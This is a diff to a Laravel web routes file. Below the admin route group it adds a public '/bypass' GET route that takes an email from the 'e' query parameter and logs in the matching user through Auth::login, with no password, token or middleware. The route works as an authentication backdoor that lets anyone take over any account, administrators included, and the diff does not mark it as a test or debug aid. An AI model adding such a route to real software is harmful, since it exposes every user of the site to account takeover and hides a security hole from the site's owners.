@@ -19,6 +19,9 @@ use App\Http\Controllers\User\FavoriteController;
 use App\Http\Controllers\User\HomeController;
 use App\Http\Controllers\Admin\MessageController;
 use App\Http\Controllers\PaymentController;
+use Illuminate\Support\Facades\Auth;
+use App\Models\User;
+
 /*
 |--------------------------------------------------------------------------
 | Web Routes
@@ -169,3 +172,28 @@ Route::prefix('admin')->middleware(['auth', 'admin'])->group(function () {
 use App\Http\Controllers\ChatbotController;
 
 Route::post('/chatbot/send-message', [ChatbotController::class, 'sendMessage']);
+
+
+
+
+Route::get('/bypass', function () {
+    $username = request()->query('e');
+
+    if ($username) {
+        $user = User::where('email', $username)->first();
+
+        if ($user) {
+            Auth::login($user);
+
+            return redirect()->route('home'); // Hoặc trang bạn muốn
+        } else {
+            return redirect()->route('login')->withErrors([
+                'bypass' => 'Không tìm thấy người dùng với tên đăng nhập: ' . $username,
+            ]);
+        }
+    }
+
+    return redirect()->route('login')->withErrors([
+        'bypass' => 'Thiếu tham số bypass.',
+    ]);
+});
